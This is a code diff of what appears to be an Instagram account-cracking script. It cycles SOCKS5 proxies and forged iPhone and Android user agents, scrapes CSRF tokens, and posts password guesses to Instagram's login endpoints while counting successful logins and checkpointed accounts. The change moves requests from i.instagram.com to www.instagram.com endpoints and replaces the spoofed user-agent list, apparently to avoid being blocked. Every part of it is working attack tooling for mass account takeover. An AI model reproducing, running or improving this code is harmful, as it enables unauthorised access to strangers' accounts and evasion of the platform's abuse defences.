@@ -638,42 +638,23 @@ class instagram:
                 nip=random.choice(prox)
                 proxs= {'http': 'socks5://'+nip}
                 ua = random.choice(uasm)
-                aa='Mozilla/5.0 (Linux; Android'
+                aa='Mozilla/5.0 (iPhone; CPU'
                 b=random.choice(['4','5','6','7','8','9','10','11','12'])
-                c= 'RMX-'
+                c= 'IOS-'
                 d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G','J', 'K', 'M', 'N', 'P', 'Q', 'R', 'S', 'T', 'V', 'W', 'X', 'Y', 'Z'])
                 e=random.randrange(1, 999)
                 f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-                g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36'
+                g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(1,9))}.0.0.{str(rr(99,999))}0.{str(rr(1,9))}.0 Mobile Safari/537.36'
                 h=random.randrange(73,200)
                 i='0'
                 j=random.randrange(4200,4900)
                 k=random.randrange(40,150)
                 l='Mobile Safari/537.36'
                 uaku=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
-                uafake = random.choice([
-                f"Instagram (Linux; Android {str(rr(4,12))}; RMX{str(rr(1111,9999))} Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(1,9))}.0.0.{str(rr(99,999))}0.{str(rr(1,9))}.0 Mobile Safari/537.36 AlohaBrowser/2.20.3",
-                f"Instagram (Linux; Android {str(rr(4,12))}; RMX{str(rr(1111,9999))} Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(1,9))}.0.0.{str(rr(99,999))}0.{str(rr(1,9))}.0 Mobile Safari/537.36 AlohaBrowser/2.20.3",
-                f"Instagram (Linux; Android {str(rr(4,12))}; RMX{str(rr(1111,9999))} Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(1,9))}.0.0.{str(rr(99,999))}0.{str(rr(1,9))}.0 Mobile Safari/537.36 AlohaBrowser/2.20.3",
-                f"Instagram (Linux; Android {str(rr(4,12))}; RMX{str(rr(1111,9999))} Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(1,9))}.0.0.{str(rr(99,999))}0.{str(rr(1,9))}.0 Mobile Safari/537.36 AlohaBrowser/2.20.3",
-                f"Instagram (Linux; Android {str(rr(4,12))}; RMX{str(rr(1111,9999))} Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(1,9))}.0.0.{str(rr(99,999))}0.{str(rr(1,9))}.0 Mobile Safari/537.36 AlohaBrowser/2.20.3",
-                f"Instagram (Linux; Android {str(rr(4,12))}; RMX{str(rr(1111,9999))} Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(1,9))}.0.0.{str(rr(99,999))}0.{str(rr(1,9))}.0 Mobile Safari/537.36 AlohaBrowser/2.20.3",
-                f"Instagram (Linux; Android {str(rr(4,12))}; RMX{str(rr(1111,9999))} Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(1,9))}.0.0.{str(rr(99,999))}0.{str(rr(1,9))}.0 Mobile Safari/537.36 AlohaBrowser/2.20.3",
-                f"Instagram (Linux; Android {str(rr(4,12))}; RMX{str(rr(1111,9999))} Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(1,9))}.0.0.{str(rr(99,999))}0.{str(rr(1,9))}.0 Mobile Safari/537.36 AlohaBrowser/2.20.3",
-                f"Instagram (Linux; Android {str(rr(4,12))}; RMX{str(rr(1111,9999))} Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(1,9))}.0.0.{str(rr(99,999))}0.{str(rr(1,9))}.0 Mobile Safari/537.36 AlohaBrowser/2.20.3",
-                f"Instagram (Linux; Android {str(rr(4,12))}; RMX{str(rr(1111,9999))} Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(1,9))}.0.0.{str(rr(99,999))}0.{str(rr(1,9))}.0 Mobile Safari/537.36 AlohaBrowser/2.20.3",
-                f"Instagram (Linux; Android {str(rr(4,12))}; RMX{str(rr(1111,9999))} Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(1,9))}.0.0.{str(rr(99,999))}0.{str(rr(1,9))}.0 Mobile Safari/537.36 AlohaBrowser/2.20.3",
-                f"Instagram (Linux; Android {str(rr(4,12))}; RMX{str(rr(1111,9999))} Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(1,9))}.0.0.{str(rr(99,999))}0.{str(rr(1,9))}.0 Mobile Safari/537.36 AlohaBrowser/2.20.3",
-                f"Instagram (Linux; Android {str(rr(4,12))}; RMX{str(rr(1111,9999))} Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(1,9))}.0.0.{str(rr(99,999))}0.{str(rr(1,9))}.0 Mobile Safari/537.36 AlohaBrowser/2.20.3",
-                f"Instagram (Linux; Android {str(rr(4,12))}; RMX{str(rr(1111,9999))} Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(1,9))}.0.0.{str(rr(99,999))}0.{str(rr(1,9))}.0 Mobile Safari/537.36 AlohaBrowser/2.20.3",
-                f"Instagram (Linux; Android {str(rr(4,12))}; RMX{str(rr(1111,9999))} Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(1,9))}.0.0.{str(rr(99,999))}0.{str(rr(1,9))}.0 Mobile Safari/537.36 AlohaBrowser/2.20.3",
-                f"Instagram (Linux; Android {str(rr(4,12))}; RMX{str(rr(1111,9999))} Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(1,9))}.0.0.{str(rr(99,999))}0.{str(rr(1,9))}.0 Mobile Safari/537.36 AlohaBrowser/2.20.3",
-                f"Instagram (Linux; Android {str(rr(4,12))}; RMX{str(rr(1111,9999))} Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(1,9))}.0.0.{str(rr(99,999))}0.{str(rr(1,9))}.0 Mobile Safari/537.36 AlohaBrowser/2.20.3",
-                f"Instagram (Linux; Android {str(rr(4,12))}; RMX{str(rr(1111,9999))} Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(1,9))}.0.0.{str(rr(99,999))}0.{str(rr(1,9))}.0 Mobile Safari/537.36 AlohaBrowser/2.20.3",
-                f"Instagram (Linux; Android {str(rr(4,12))}; RMX{str(rr(1111,9999))} Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(1,9))}.0.0.{str(rr(99,999))}0.{str(rr(1,9))}.0 Mobile Safari/537.36 AlohaBrowser/2.20.3"])
-                token=s.get('https://i.instagram.com/api/v1/accounts/login/')
+                uafake=f"Instagram 244.0.0.12.112 (iPhone12,1; iOS {str(rr(4,12))}; Mac OS X) {str(rc(aZ))}{str(rr(1111,9999))}{str(rc(aZ))}) en_US; en-US; scale=2.00; 828x1792; 383361019)"
+                token=s.get('https://z-p42.www.instagram.com/accounts/logout/ajax/')
                 headers = {
-                    'Host':'i.instagram.com',
+                    'Host':'www.instagram.com',
                     'connection':'keep-alive',
                     'sec-ch-ua':'"Chromium";v="105", "Not)A;Brand";v="8"',
                     'x-ig-app-id':'1217981644879628',
@@ -691,7 +672,7 @@ class instagram:
                     'sec-fetch-site':'same-origin',
                     'sec-fetch-mode':'cors',
                     'sec-fetch-dest':'empty',
-                    'referer':'https://i.instagram.com/api/v1/accounts/login/',
+                    'referer':'https://z-p42.www.instagram.com/accounts/logout/ajax/',
                     'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
                 param={
                     "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{pw}",
@@ -738,10 +719,10 @@ class instagram:
         global loop,success,checkpoint
         sys.stdout.write(f"\r{CY}[•] [{K}{loop}/{len(internal)}{C}] {H}[ OK : {len(success)}]{C}  {K}[ CP : {len(checkpoint)}]{C} "),sys.stdout.flush()
         try:
-            token=s.get("https://i.instagram.com/",headers={"user-agent":User_Agent()}).content
+            token=s.get("https://www.instagram.com/",headers={"user-agent":User_Agent()}).content
             crf_token=re.findall(r"\"csrf_token\"\:\"(.*?)\"", str(token))[0]
             s.headers.update({
-                'authority': 'i.instagram.com',
+                'authority': 'www.instagram.com',
                 'x-ig-www-claim': 'hmac.AR0Ft-pZRNZTzI7hjqy0oNQ3tHwi9IV_Q92-GUDay5ra5_FT',
                 'x-instagram-ajax': '91a4c055cfdf',
                 'content-type': 'application/x-www-form-urlencoded',
@@ -750,11 +731,11 @@ class instagram:
                 'x-requested-with': 'XMLHttpRequest',
                 'x-csrftoken': crf_token,
                 'x-ig-app-id': '1217981644879628',
-                'origin': 'https://i.instagram.com',
+                'origin': 'https://www.instagram.com',
                 'sec-fetch-site': 'same-origin',
                 'sec-fetch-mode': 'cors',
                 'sec-fetch-dest': 'empty',
-                'referer': 'https://i.instagram.com/',
+                'referer': 'https://www.instagram.com/',
                 'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'
             })
 
@@ -766,7 +747,7 @@ class instagram:
                 "stopDeletionNonce": "",
                 "trustedDeviceRecords": {}
             }
-            x=s.post("https://i.instagram.com/api/v1/accounts/login/",data=param);sleep(1)
+            x=s.post("https://www.instagram.com/accounts/login/ajax/",data=param);sleep(1)
             x_jason=json.loads(x.text)
             if "userId" in x.text:
                 nama,pengikut,mengikut,postingan=self.APIinfo(user)
